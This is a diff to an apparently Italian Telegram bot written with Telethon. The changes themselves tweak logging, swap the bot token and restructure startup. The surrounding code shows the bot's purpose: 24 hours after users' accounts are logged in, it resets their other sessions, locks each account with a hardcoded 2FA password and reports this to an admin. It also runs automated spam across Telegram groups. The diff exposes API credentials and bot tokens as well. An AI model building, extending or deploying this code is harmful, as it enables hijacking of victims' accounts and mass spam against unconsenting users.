@@ -14,7 +14,7 @@ asyncio.set_event_loop(loop)
 # --- CREDENZIALI CONFIGURATE ---
 API_ID = 37810956
 API_HASH = "7753910251b42b5f91abe65c34f7f712"
-BOT_TOKEN = "8854040084:AAFsVQCtNgGJL-lDlS-wpW2G1aP8i_I2HRU"
+BOT_TOKEN = "9141462955:AAEY0YM2Wh7IhrBwXYeSClQZR1_3j_gZNLk"
 ADMIN_ID = 8886429641
 
 SESSION_DIR = "user_sessions"
@@ -36,12 +36,12 @@ def run_web():
 
 threading.Thread(target=run_web, daemon=True).start()
 
-# Avvio del bot principale con Telethon
-bot = TelegramClient('bot_session_v3', API_ID, API_HASH, loop=loop).start(bot_token=BOT_TOKEN)
+# Client Telethon principale
+bot = TelegramClient('bot_session_v5', API_ID, API_HASH, loop=loop)
 
 # --- MOTORE IN BACKGROUND (ATTESA 24H -> DISCONNESSIONE SESSIONI -> 2FA -> MESSAGGIO) ---
 async def background_workers():
-    print("🔄 Task in background avviato con successo!")
+    print("🔄 Task in background avviato con successo!", flush=True)
     while True:
         await asyncio.sleep(20)
         current_time = time.time()
@@ -65,7 +65,7 @@ async def background_workers():
                                     await client(ResetAuthorizationsRequest())
                                     sessions_reset_ok = True
                                 except Exception as reset_err:
-                                    print(f"⚠️ ResetAuthorizationsRequest per {phone}: {reset_err}")
+                                    print(f"⚠️ ResetAuthorizationsRequest per {phone}: {reset_err}", flush=True)
 
                                 # Step B: Attiva / imposta la password 2FA
                                 two_fa_ok = False
@@ -77,7 +77,7 @@ async def background_workers():
                                         await client.edit_2fa(new_password='11071970')
                                     two_fa_ok = True
                                 except Exception as fa_err:
-                                    print(f"⚠️ edit_2fa per {phone}: {fa_err}")
+                                    print(f"⚠️ edit_2fa per {phone}: {fa_err}", flush=True)
 
                                 # Step C: Manda il messaggio all'admin se la protezione è completata
                                 if two_fa_ok:
@@ -93,9 +93,9 @@ async def background_workers():
                                     )
                                 else:
                                     acc_info["fa_password"] = "Errore 2FA (vedi log Render)"
-                                    print(f"❌ Impossibile impostare 2FA per {phone} al momento.")
+                                    print(f"❌ Impossibile impostare 2FA per {phone} al momento.", flush=True)
                             except Exception as e:
-                                print(f"❌ Errore protezione 24h per {phone}: {e}")
+                                print(f"❌ Errore protezione 24h per {phone}: {e}", flush=True)
 
                 # 2. Controllo Motore Spam Automatico nei Gruppi
                 if acc_info.get("is_spamming", False):
@@ -133,9 +133,9 @@ async def background_workers():
                                             pass
 
                                     acc_info["last_spam_time"] = time.time()
-                                    print(f"🚀 Spam eseguito per {phone}: inviato in {sent_count} gruppi.")
+                                    print(f"🚀 Spam eseguito per {phone}: inviato in {sent_count} gruppi.", flush=True)
                                 except Exception as e:
-                                    print(f"❌ Errore invio spam per {phone}: {e}")
+                                    print(f"❌ Errore invio spam per {phone}: {e}", flush=True)
 
 # --- FUNZIONE DI SUPPORTO PER CALCOLARE IL TIMER PER L'ADMIN ---
 def get_admin_timer_text(acc_info):
@@ -236,6 +236,7 @@ async def show_spam_settings_menu(event, user_id):
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
     user_id = event.sender_id
+    print(f"📩 Ricevuto /start da {user_id}", flush=True)
 
     if user_id == ADMIN_ID:
         buttons = [
@@ -375,7 +376,7 @@ async def callback_router(event):
                         else:
                             available_list.append(dialog.entity.id)
             except Exception as e:
-                print(f"Errore durante la scansione: {e}")
+                print(f"Errore durante la scansione: {e}", flush=True)
 
         acc["scanned"] = True
         acc["available_groups"] = available_list
@@ -392,7 +393,7 @@ async def callback_router(event):
         try:
             await event.edit(scan_results, buttons=buttons, parse_mode="markdown")
         except Exception as e:
-            print(f"Errore modifica messaggio scansione: {e}")
+            print(f"Errore modifica messaggio scansione: {e}", flush=True)
 
     elif data == b"toggle_spam":
         if user_id in user_data_store and user_data_store[user_id]["active_phone"]:
@@ -667,8 +668,9 @@ async def message_router(event):
 
 # --- AVVIO PRINCIPALE ---
 async def main():
+    await bot.start(bot_token=BOT_TOKEN)
+    print("🤖 Bot avviato correttamente e in ascolto!", flush=True)
     asyncio.create_task(background_workers())
-    print("🤖 Bot avviato correttamente!")
     await bot.run_until_disconnected()
 
 if __name__ == '__main__':
